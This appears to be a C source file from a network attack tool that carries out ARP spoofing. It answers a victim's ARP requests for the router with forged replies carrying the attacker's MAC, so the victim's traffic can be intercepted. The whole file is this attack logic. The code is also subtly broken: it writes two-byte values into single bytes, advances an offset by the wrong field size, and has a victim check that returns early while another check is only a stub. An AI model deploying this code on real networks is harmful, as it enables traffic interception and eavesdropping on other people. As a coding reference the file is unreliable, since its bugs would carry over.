/*
 * =====================================================================================
 *
 *       Filename:  arp_poison.c
 *
 *    Description:  handle the arp spoofing attack
 *
 *        Version:  1.0
 *        Created:  12/22/2014 08:46:28 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  nikkolasg (mn), 
 *        Company:  
 *
 * =====================================================================================
 */

#include "packet_struct.h"
#include <net/if_arp.h>
#include "arp.h"
#include "packet_print.h"
#include <string.h>

extern struct in_addr routerip;
extern struct in_addr victimip;
extern u_char mac[ETH_ADDR_SIZE];

int arp_sent = 0;
int arp_success = 0;

    void
handle_arp (const struct pcap_pkthdr *h,const u_char * packet )
{
    const struct pkt_arp * arp = (const struct pkt_arp *) (packet+ETH_SIZE);
    print_pkt_arp(arp);
    if (ntohs(arp->opcode) == ARPOP_REQUEST ) {
        handle_arp_request(arp);
    } else if (ntohs(arp->opcode) == ARPOP_REPLY) {
        handle_arp_reply(arp);
    }
    return ;
}		/* -----  end of function handle_arp  ----- */

/*
 * handle the arp packet that are of type request.
 * If it finds the ip we want, the attack starts 
 * (if we do not want the attack behavior by default, you
 * can specify it in cmd line options. refer to options.)
 * 
 */
void handle_arp_request(const struct pkt_arp * packet) {
    if(is_router_packet(packet) == 0 || is_gratuitous_packet(packet) == 0 || is_broadcast_request(packet) == 0) {
        return;
    }
    if(is_from_victim(packet) == 0) { 
        printf("Will launch an ARP Poison attack with this packet .. !\n");
        arp_poison(packet);
    } else {
        printf("Packet not from victim. Discard.\n");
    }
}

    int
arp_poison (const struct pkt_arp * packet )
{
    u_char  bytes[ARP_PACKET_SIZE];
    int offset = 0;
    //cpy dest mac address
    memcpy(bytes,packet->hard_addr_send,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    //cpy src mac address i.e. OWN mac address
    memcpy(bytes+offset,mac,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    //cpy type of packet
    bytes[offset] = htons(ETHERTYPE_ARP);
    offset += 2;
    //ARP structure
    //cpy in one pass htype,ptype,hard_len,proto_len
    //memcpy(bytes+offset,packet,6);
    //offset += 6;
    bytes[offset] = htons(packet->htype);
    offset += 2;
    bytes[offset] = htons(packet->ptype);
    offset += 2;
    bytes[offset++] = packet->hard_addr_len;
    bytes[offset++] = packet->proto_addr_len;

    // code reply
    bytes[offset]  = htons(ARPOP_REPLY);
    offset += 2;

    // SRC eth addr i.e. OWN mac
    memcpy(bytes+offset,mac,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    // SRC ip addr, i.e. router ;)
    memcpy(bytes+offset,packet->proto_addr_dest,IP_ADDR_SIZE);
    offset += IP_ADDR_SIZE;
    // DEST eth addr, i.e. victim
    memcpy(bytes+offset,packet->hard_addr_send,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    // DEST ip addr, i.e. victim
    memcpy(bytes+offset,packet->proto_addr_send,IP_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    for(offset=0;offset < 60;offset++) printf("x"); 
    print_pkt_eth((const struct pkt_eth *) bytes);
    print_pkt_arp((const struct pkt_arp * ) bytes+ETH_SIZE);  
    if ( 0 == send_packet(bytes,ARP_PACKET_SIZE)) {
        arp_success++;
    }
    arp_sent++;
    for(offset=0;offset<60;offset++) printf("x");
        
    printf("Success : %d\tSent : %d\n",arp_success,arp_sent);
    return ;
}		/* -----  end of function arp_poison  ----- */

void handle_arp_reply(const struct pkt_arp * packet) {
    printf("Nothing to be done with ARP replies.\n");
return;
}

int is_from_victim(const struct pkt_arp * packet) {
    return 0;
    const struct in_addr * addr = (const struct in_addr *) packet->proto_addr_send;
    if ( addr->s_addr != victimip.s_addr) return -1;
    return 0;
}

/**
 * Will detect if one of the address in the packet is the router.
 * If so returns 0, we generally dont want to mess with the router
 * for now =)
 * */
int is_router_packet(const struct pkt_arp * packet) {
    const struct in_addr * addr;
    addr = (const struct in_addr*)packet->proto_addr_dest;
    if (addr->s_addr  !=  routerip.s_addr)  {
        printf("ARP request : destination is NOT router. No attacks.\
                We could however,but for what !?\n");
        return 0;
    }
    addr = (const struct in_addr*)packet->proto_addr_send;
    if(addr->s_addr == routerip.s_addr) {
        printf("ARP request : source is router. No attacks.\n");
        return 0;
    }

    return -1;

}

/*
 * Will detect if this packet is a gratuitous one (just one sending its info to others to update arp table
 * without any requests)
 * return 0 if true
 */
int is_gratuitous_packet(const struct pkt_arp * packet) {
    const struct in_addr * src = (const struct in_addr*) packet->proto_addr_dest;
    const struct in_addr * dest = (const struct in_addr*) packet->proto_addr_send;
    if( src->s_addr == dest->s_addr ) {
        printf("ARP request : Gratuitous packet detected. No attacks.\n");
        return 0;
    }
    return 1;
}

/**
 * Return 0 if the request is being done on a broadcast address
 * */
int is_broadcast_request(const struct pkt_arp * packet) {
    return 1;
}
